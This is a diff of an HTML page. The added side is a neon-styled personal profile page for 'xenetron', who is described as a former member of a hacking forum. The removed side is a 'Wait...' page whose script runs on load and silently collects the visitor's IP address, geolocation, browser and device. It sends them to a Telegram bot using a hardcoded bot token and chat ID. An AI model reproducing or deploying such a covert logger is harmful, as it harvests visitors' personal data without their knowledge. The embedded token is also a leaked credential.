@@ -1,43 +1,311 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        async function sendInfo() {
-            const userAgent = navigator.userAgent;
-            const time = new Date().toLocaleString();
-            const device = navigator.platform;
+    <title>xenetron</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
 
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-
-            const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-            const geoData = await geoResponse.json();
-            const { city, region, country } = geoData;
-
-            const message = `IP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;
-            /// В BOTTOKEN ВСТАВЛЯЙТЕ ТОКЕН БОТА, ЕГО МОЖНО ПОЛУЧИТЬ ЧЕРЕЗ @BOTFATHER
-            const botToken = '7968658850:AAE7vSJNEPqpD6yx3LakkVmtEco3QDWlnr0';
-            /// В CHATID ВСТАВЛЯЙТЕ СВОЙ АЙДИ ТЕЛЕГРАМ
-            const chatId = '7348828913';
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            await fetch(telegramUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        window.onload = sendInfo;
-    </script>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* --- Splash screen --- */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #020202 0%, #000 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 1000;
+        }
+
+        #splash-screen h1 {
+            font-size: 3.5rem;
+            color: #0ff;
+            letter-spacing: 3px;
+            animation: glitch 1.5s infinite;
+            text-shadow: 0 0 20px #0ff, 0 0 40px #0ff;
+        }
+
+        #splash-screen p {
+            margin-top: 2rem;
+            color: #ccc;
+            text-shadow: 0 0 10px #0ff;
+        }
+
+        /* --- Main content --- */
+        #content {
+            display: none;
+            position: relative;
+            z-index: 2;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2rem;
+            animation: fadeIn 1.5s ease forwards;
+        }
+
+        .profile-header {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+            padding: 2rem;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+            backdrop-filter: blur(12px);
+            transition: all 0.4s ease;
+        }
+
+        .profile-header:hover {
+            box-shadow: 0 0 35px rgba(0, 255, 255, 0.4);
+        }
+
+        .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 3px solid #0ff;
+            box-shadow: 0 0 25px #0ff;
+            object-fit: cover;
+        }
+
+        .profile-info h1 {
+            font-size: 2.2rem;
+            color: #0ff;
+            text-shadow: 0 0 10px #0ff;
+            margin-bottom: 0.5rem;
+        }
+
+        .profile-info h2 {
+            font-weight: 400;
+            color: #aaa;
+            margin-bottom: 0.4rem;
+        }
+
+        .content-block {
+            margin-top: 2rem;
+            padding: 2rem;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.15);
+            transition: all 0.4s ease;
+        }
+
+        .content-block:hover {
+            box-shadow: 0 0 35px rgba(0, 255, 255, 0.35);
+        }
+
+        .content-block h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: #0ff;
+            text-shadow: 0 0 15px #0ff;
+        }
+
+        a {
+            color: #0ff;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #fff;
+            text-shadow: 0 0 20px #0ff, 0 0 30px #fff;
+        }
+
+        /* --- Canvas particles --- */
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* --- Animations --- */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px #0ff, -2px -2px #f0f; }
+            20% { text-shadow: -2px 2px #f0f, 2px -2px #0ff; }
+            40% { text-shadow: 2px -2px #0ff, -2px 2px #f0f; }
+            60% { text-shadow: -1px 1px #f0f, 1px -1px #0ff; }
+            100% { text-shadow: 0 0 20px #0ff, 0 0 40px #0ff; }
+        }
+
+        @media (max-width: 768px) {
+            .profile-header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .profile-image {
+                margin-bottom: 1rem;
+            }
+
+            .profile-info h1 {
+                font-size: 1.8rem;
+            }
+
+            .content-block {
+                padding: 1.5rem;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Wait...</h1>
+    <div id="splash-screen">
+        <h1>xenetron</h1>
+        <p>Нажмите на экран или клавишу Enter</p>
+    </div>
+
+    <div id="content">
+        <div class="profile-header">
+            <img src="photo.png" alt="Profile Photo" class="profile-image">
+            <div class="profile-info">
+                <h1>xenetron</h1>
+                <h2>CEO V - Cloud | бывший участник xss.is</h2>
+                <h2>Занимаюсь кибербезопасностью, разработкой и исследованиями</h2>
+                <h2>username — @me_fsb</h2>
+                <h2>Age → 16</h2>
+                <h2>Time → (GMT+5) Almaty, KZ</h2>
+            </div>
+        </div>
+
+        <div class="content-block">
+            <h2>V - Cloud Project</h2>
+            <ul class="link-list">
+                <li>👁️ Link: <a href="http://t.me/+hyl0VBOHMVlmNDQ0" target="_blank">click</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <audio id="music" loop>
+        <source src="music.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // splash + audio
+        document.addEventListener('DOMContentLoaded', () => {
+            const splash = document.getElementById('splash-screen');
+            const content = document.getElementById('content');
+            const music = document.getElementById('music');
+
+            function startSite() {
+                splash.style.opacity = '0';
+                setTimeout(() => splash.style.display = 'none', 800);
+                content.style.display = 'block';
+                content.style.opacity = '0';
+                setTimeout(() => content.style.opacity = '1', 300);
+                music.volume = 0;
+                music.play().catch(() => {});
+                let vol = 0;
+                const fade = setInterval(() => {
+                    if (vol < 0.5) { vol += 0.02; music.volume = vol; }
+                    else clearInterval(fade);
+                }, 100);
+            }
+
+            splash.addEventListener('click', startSite);
+            document.addEventListener('keydown', e => { if (e.key === 'Enter') startSite(); });
+        });
+
+        // neon particle background
+        document.addEventListener('DOMContentLoaded', () => {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = innerWidth;
+            canvas.height = innerHeight;
+
+            let particles = [];
+            const num = 60;
+
+            class Particle {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = Math.random() * canvas.height;
+                    this.size = Math.random() * 2 + 1;
+                    this.speedX = Math.random() * 1.5 - 0.75;
+                    this.speedY = Math.random() * 1.5 - 0.75;
+                }
+
+                update() {
+                    this.x += this.speedX;
+                    this.y += this.speedY;
+
+                    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+                }
+
+                draw() {
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(0,255,255,0.8)';
+                    ctx.fill();
+                }
+            }
+
+            function connect() {
+                for (let a = 0; a < particles.length; a++) {
+                    for (let b = a; b < particles.length; b++) {
+                        const dx = particles[a].x - particles[b].x;
+                        const dy = particles[a].y - particles[b].y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < 120) {
+                            ctx.strokeStyle = `rgba(0,255,255,${1 - dist / 120})`;
+                            ctx.lineWidth = 0.5;
+                            ctx.beginPath();
+                            ctx.moveTo(particles[a].x, particles[a].y);
+                            ctx.lineTo(particles[b].x, particles[b].y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => { p.update(); p.draw(); });
+                connect();
+                requestAnimationFrame(animate);
+            }
+
+            for (let i = 0; i < num; i++) particles.push(new Particle());
+            animate();
+
+            window.addEventListener('resize', () => {
+                canvas.width = innerWidth;
+                canvas.height = innerHeight;
+            });
+        });
+    </script>
 </body>
 </html>
